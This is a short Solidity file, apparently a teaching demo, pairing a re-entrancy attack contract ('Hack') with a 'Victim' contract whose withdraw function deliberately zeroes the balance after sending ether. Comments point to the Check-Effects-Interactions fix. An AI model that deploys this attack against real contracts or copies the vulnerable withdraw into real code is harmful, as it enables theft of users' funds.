// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library Errors {
  error TxNotSucceded();
  error NoEnoughFounds();
}

contract Hack {

    address public victim;
    address public owner;

    constructor(address _victim) payable {
        owner = msg.sender;
        victim = _victim;
        Victim(_victim).getEth{value: msg.value}();
    }

    function hack() public {
        Victim(victim).withdraw();
    }


    receive() external payable {
    if(address(victim).balance >= 1 ether)
        hack();
    }

    function withdraw() public {
        payable(owner).transfer(address(this).balance);
    }


}


contract Victim {
  
    mapping(address => uint) public balances;

    constructor() payable {

    }

    function getEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function getBalance() public view returns(uint){
        return address(this).balance;
    }
    //Always use Check_Effects_Interactions pattern to avoid re-entrancy attack
    function withdraw() public {
        uint value = balances[msg.sender];
        require( value > 0 , Errors.NoEnoughFounds());
        //balances[msg.sender] = 0; //this action should be done before send funds;
        (bool result, ) = msg.sender.call{value: value}("");
        require(result, Errors.TxNotSucceded());
        balances[msg.sender] = 0; //this action should be done before send funds;
    }
}